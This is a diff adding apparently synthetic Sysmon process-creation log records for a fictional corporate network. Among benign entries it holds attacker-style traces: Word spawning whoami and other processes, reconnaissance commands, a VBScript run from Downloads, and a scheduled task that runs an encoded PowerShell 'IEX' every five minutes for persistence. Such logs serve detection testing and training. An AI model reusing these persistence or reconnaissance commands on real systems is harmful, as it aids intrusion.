+      <Data Name="UtcTime">2026-07-26 08:03:50.550</Data>
+      <Data Name="ProcessGuid">{8181a8cc-43e4-21e8-eeea-e1805958a499}</Data>
+      <Data Name="ProcessId">2127</Data>
+      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1001</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">whoami.exe</Data>
+      <Data Name="CommandLine">whoami.exe /all</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{5e9953d2-48f4-2862-702c-8b10d5704f32}</Data>
+      <Data Name="LogonId">0xc41b31</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=CE9E1A11FCBB4E59FBDDCF7C9C96E9EC,SHA256=EE87905E4CA415EA8DFA6A56D12DBC9AAAF915310200B1F08768A84FA76AFDE6,IMPHASH=E0CCEDC5F05DB76E1A84A51AA9D3D7C7</Data>
+      <Data Name="ParentProcessGuid">{2260e70f-43b4-1d8c-e3c4-be0f1b66b5a9}</Data>
+      <Data Name="ParentProcessId">3546</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:34:28.3415796Z"/>
+      <EventRecordID>184011</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION22.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:34:28.351</Data>
+      <Data Name="ProcessGuid">{afffcfd2-a25d-da58-4394-7d1081627cf1}</Data>
+      <Data Name="ProcessId">5114</Data>
+      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3466</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">ipconfig.exe</Data>
+      <Data Name="CommandLine">ipconfig.exe /all</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{0d01280f-17a0-a260-6c6f-46d4d450281c}</Data>
+      <Data Name="LogonId">0x1b4945</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=A319DCB4217D65A0C56811CD5563F616,SHA256=6D7CE3C9B4A69F3C8D3AED99711C21C9BDC14F1F295D6FBF430F801DFAD409E2,IMPHASH=13432E611CA3C4480279B6A68F9797B0</Data>
+      <Data Name="ParentProcessGuid">{f1eedba3-e213-b0e6-e767-8bab26286bfb}</Data>
+      <Data Name="ParentProcessId">1590</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:23:00.0701771Z"/>
+      <EventRecordID>184012</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION22.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:23:00.130</Data>
+      <Data Name="ProcessGuid">{4eea04e7-5d59-e623-eede-f8e1cbceabde}</Data>
+      <Data Name="ProcessId">1653</Data>
+      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1466</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">svchost.exe</Data>
+      <Data Name="CommandLine">C:\Windows\System32\svchost.exe -k netsvcs -p</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{35c7936c-ae9b-3fe1-aabc-5a8a1a50aec3}</Data>
+      <Data Name="LogonId">0xd7b5b2</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">MD5=F94D62046808593FDFED2C43E256A6DC,SHA256=2999B735DD56CC943C9AD14CEE0CAEB5ECFEDB992790CEBDBFDDC3D99EE3AC2A,IMPHASH=2D534DD0CF8EBC5ACCC56569F9E8A369</Data>
+      <Data Name="ParentProcessGuid">{e1a47e10-698c-0658-2dea-ecabbc8f7d29}</Data>
+      <Data Name="ParentProcessId">6442</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:15:49.1813543Z"/>
+      <EventRecordID>184013</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION22.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:15:49.163</Data>
+      <Data Name="ProcessGuid">{61ee411a-df46-09e9-dbcc-38f1787f2425}</Data>
+      <Data Name="ProcessId">4269</Data>
+      <Data Name="Image">C:\Windows\explorer.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3345</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">explorer.exe</Data>
+      <Data Name="CommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="CurrentDirectory">C:\Users\SYSTEM\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{eb1fa9f2-75d6-5983-4e20-cb9bd20eac17}</Data>
+      <Data Name="LogonId">0xef0f06</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=3170F437A8F7EF5A060EDF5B39118497,SHA256=4774BC58C5F8BC16F7860B5011C58EF0DD463C09475287AA5408F9AC6601DDD0,IMPHASH=6651529E8268690BA43825B559E4B671</Data>
+      <Data Name="ParentProcessGuid">{adf4e62d-fb2c-d7fa-8945-f07154c63cd8}</Data>
+      <Data Name="ParentProcessId">1452</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n</Data>
+      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:03:16.7290770Z"/>
+      <EventRecordID>184014</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:03:16.111</Data>
+      <Data Name="ProcessGuid">{587ef344-ba81-c953-504d-9b306fb78271}</Data>
+      <Data Name="ProcessId">9379</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">10.0.19041.474</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">cmd.exe</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{629c2ae3-e645-939b-30a9-0b5c41357e8c}</Data>
+      <Data Name="LogonId">0xc572f3</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=CE777F00ECF27E7685197FF4006ED6E3,SHA256=3270E4FAABAE4F43BCAE8081BDF070AAF0B5156BB82C9074AFD5DEA589D7FD6C,IMPHASH=F2E9702D11E9CDAA6E6981A35D3D9E56</Data>
+      <Data Name="ParentProcessGuid">{aa0b7b14-ebb7-5487-9f87-a9d3505cc686}</Data>
+      <Data Name="ParentProcessId">3041</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:43:45.5472441Z"/>
+      <EventRecordID>184015</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:43:45.418</Data>
+      <Data Name="ProcessGuid">{6703b636-b27c-4bb0-8ded-311c2095eef6}</Data>
+      <Data Name="ProcessId">7888</Data>
+      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2724</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">schtasks.exe</Data>
+      <Data Name="CommandLine">/create /sc minute /mo 5 /tn "Updater" /tr "powershell.exe -enc SQBFAFgA"</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{f0bbac67-610f-ad64-bf85-2c8de71e43a6}</Data>
+      <Data Name="LogonId">0xad9262</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">MD5=D56F03508C459CE267F48AD54D0B0D1A,SHA256=9B4E2C249479E1E6C9277D9B6E0D264835CE884149732D6C4DCABFB7001A9A8B,IMPHASH=7118E36477097749527EECFAA79AC9AA</Data>
+      <Data Name="ParentProcessGuid">{71316269-acf5-36b5-82dc-cb327922bac2}</Data>
+      <Data Name="ParentProcessId">3780</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:07:28.3940441Z"/>
+      <EventRecordID>184016</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:07:28.838</Data>
+      <Data Name="ProcessGuid">{ac3c5640-4f77-3982-ce7a-25b832fa2de8}</Data>
+      <Data Name="ProcessId">1400</Data>
+      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="FileVersion">10.0.19041.190</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">wscript.exe</Data>
+      <Data Name="CommandLine">wscript.exe //B "C:\Users\mrodriguez\Downloads\invoice.vbs"</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{3eae0032-fbe3-79a2-9c7c-c4bbd98868dd}</Data>
+      <Data Name="LogonId">0x22a4de</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=935F2B0AA1384DDCE2D9DE5D6A18CE4C,SHA256=25C73C443E75C3B4664FA6637E8F8095624C69B6B24445A7B7E5848131C681EC,IMPHASH=E4855AA1016B6287B00805CCA7F36AE9</Data>
+      <Data Name="ParentProcessGuid">{c03f3538-dc45-c521-e2ad-c7461b494e15}</Data>
+      <Data Name="ParentProcessId">7965</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:04:49.4180853Z"/>
+      <EventRecordID>184017</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:04:49.570</Data>
+      <Data Name="ProcessGuid">{eadf5085-d92c-1f11-74da-cd29222282e1}</Data>
+      <Data Name="ProcessId">8612</Data>
+      <Data Name="Image">C:\Windows\System32\net.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2735</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">net.exe</Data>
+      <Data Name="CommandLine">net.exe user</Data>
+      <Data Name="CurrentDirectory">C:\Users\SYSTEM\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{87f8424d-fce6-8f15-986f-f335513a7052}</Data>
+      <Data Name="LogonId">0xd15810</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=E45B712EB8225688D0A444329CD6C852,SHA256=28BE9288E5AF6E39722764E68C41561BE827A1B9D4A02E536D3EE1DC81392443,IMPHASH=7337C59979844388DC8AEE30BE6033F7</Data>
+      <Data Name="ParentProcessGuid">{425a609f-c074-3f4b-d701-46fda33dc7af}</Data>
+      <Data Name="ParentProcessId">9540</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:07:12.4793722Z"/>
+      <EventRecordID>184018</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:07:12.730</Data>
+      <Data Name="ProcessGuid">{3c07c574-458f-55fa-51d8-8a47e49d681d}</Data>
+      <Data Name="ProcessId">2320</Data>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="FileVersion">10.0.19041.567</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">rundll32.exe</Data>
+      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{269cd696-3b33-620e-b1a6-b4d7271e3ee2}</Data>
+      <Data Name="LogonId">0x46c59d</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=8AE8905B54B4A48268586EBA6A34C854,SHA256=E7A37E8163B4C08B6B8E869FD5385B0E34F3193C0FF0A55C6A702E2F7746D0BA,IMPHASH=B20DCB6EF2311F1795863A76C51155FF</Data>
+      <Data Name="ParentProcessGuid">{05000bc6-db52-e172-c3fe-61609360715f}</Data>
+      <Data Name="ParentProcessId">8814</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T09:10:37.7030010Z"/>
+      <EventRecordID>184019</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 09:10:37.913</Data>
+      <Data Name="ProcessGuid">{89c8d2ab-bf5d-bc10-8bcf-9a6eccc42903}</Data>
+      <Data Name="ProcessId">4613</Data>
+      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2000</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">whoami.exe</Data>
+      <Data Name="CommandLine">whoami.exe /all</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{382c043f-45df-6f92-7c53-638c076e2bba}</Data>
+      <Data Name="LogonId">0x660c95</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=B963F37F67814C1FCC530E36ADDC3E13,SHA256=88BC539C9F4C3B79FB10987F20AC3703EB67146A77A6E17CD72B61082A405F12,IMPHASH=978648F864DE82E6E82C7D7B06E745F9</Data>
+      <Data Name="ParentProcessGuid">{907bfe36-a9ba-06f0-157d-6db9a48b3dbe}</Data>
+      <Data Name="ParentProcessId">3223</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:23:40.5492066Z"/>
+      <EventRecordID>184020</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:23:40.388</Data>
+      <Data Name="ProcessGuid">{362f5e5c-7467-53ac-5666-e130c2dff335}</Data>
+      <Data Name="ProcessId">7211</Data>
+      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1140</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">svchost.exe</Data>
+      <Data Name="CommandLine">C:\Windows\System32\svchost.exe -k netsvcs -p</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{c083b73a-f382-d4f8-6beb-d5bc4094dded}</Data>
+      <Data Name="LogonId">0x24f7ce</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">MD5=0D557B618A175DFEBFC00DC804F64D86,SHA256=F510AB53C7FEE39F1190F938A66FD7F739669FA759970043F3B1025BFFF9F585,IMPHASH=07F194F9C1156D6D0A4E5B70A6D964A3</Data>
+      <Data Name="ParentProcessGuid">{f319c125-3f4d-3309-d6d7-9f0f05379ff6}</Data>
+      <Data Name="ParentProcessId">3496</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:52:09.3656838Z"/>
+      <EventRecordID>184021</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:52:09.970</Data>
+      <Data Name="ProcessGuid">{770c7798-b310-4199-c453-2af45e6fea07}</Data>
+      <Data Name="ProcessId">2876</Data>
+      <Data Name="Image">C:\Windows\System32\net.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3186</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">net.exe</Data>
+      <Data Name="CommandLine">net.exe user</Data>
+      <Data Name="CurrentDirectory">C:\Users\bwilliams\</Data>
+      <Data Name="User">CORP\bwilliams</Data>
+      <Data Name="LogonGuid">{d1bdb8c0-29ec-f6f7-4fa0-94241bac5c15}</Data>
+      <Data Name="LogonId">0x1692dc</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=F54AD0A2E87466D7AD66A1BD93676A02,SHA256=B0CC1B3B9793B9B41374814632C5BD89B70B3420F1043785658B252360141DE9,IMPHASH=1A16342C3E2B6091A092F52AD4A057A7</Data>
+      <Data Name="ParentProcessGuid">{b27b3d90-c5c1-4d34-d9ac-99b4af2b99b4}</Data>
+      <Data Name="ParentProcessId">2983</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">CORP\bwilliams</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:51:42.6217147Z"/>
+      <EventRecordID>184022</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:51:42.438</Data>
+      <Data Name="ProcessGuid">{11a72609-8186-a5c5-575a-d97d033d2bce}</Data>
+      <Data Name="ProcessId">7882</Data>
+      <Data Name="Image">C:\Windows\explorer.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3369</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">explorer.exe</Data>
+      <Data Name="CommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+      <Data Name="User">CORP\jdoe</Data>
+      <Data Name="LogonGuid">{7d7ddbed-1b04-6efb-f5f6-a2b55cb85aed}</Data>
+      <Data Name="LogonId">0xf43e42</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=2D174FC96F7C15EA272A6D8EB5122DF8,SHA256=EB6C1016CEE624D09DAC6E8345241EA6A6846099F7294951859131D2BBDA0242,IMPHASH=7701F7BB7BC67E1FC64EE6E389C5B31A</Data>
+      <Data Name="ParentProcessGuid">{6f81cf4f-d363-bb24-97ac-528244b591f7}</Data>
+      <Data Name="ParentProcessId">5022</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoProfile</Data>
+      <Data Name="ParentUser">CORP\jdoe</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
